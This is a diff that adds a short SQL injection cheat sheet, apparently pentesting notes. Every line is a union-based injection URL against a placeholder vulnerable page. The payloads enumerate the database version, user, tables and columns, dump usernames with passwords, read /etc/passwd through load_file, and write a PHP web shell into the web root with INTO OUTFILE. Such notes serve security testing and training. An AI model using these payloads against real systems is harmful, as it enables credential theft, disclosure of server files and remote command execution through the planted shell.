@@ -1,0 +1,25 @@
+# Check for a row where it's possible to place your output
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,4,5,6,7,8
+
+# Get version
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,@@version,5
+
+# Get current user
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,user(),5
+
+# Get all tables
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,table_name,5 FROM information_schema.tables
+
+# Get columns names from the table users
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,column_name,5 FROM information_schema.columns where table_name='users'
+
+# Concat usernames and passwords (0x3a represents ":")
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,concat(name, 0x3A , password),5 from users
+http://vulnsite.com/index.php?id=-1+union+all+select+1,group_concat(user,0x3a,file_priv),3,4+from+mysql.user
+
+# Read a file
+http://10.10.10.10/vul.php?id=1 union all select load_file('/etc/passwd')
+
+# Write content into a file
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'
+http://10.10.10.10/vul.php?id=1 union all select 1,2,3,"system($_GET[\'c\']); ?>",5 into OUTFILE '/var/www/shell.php'
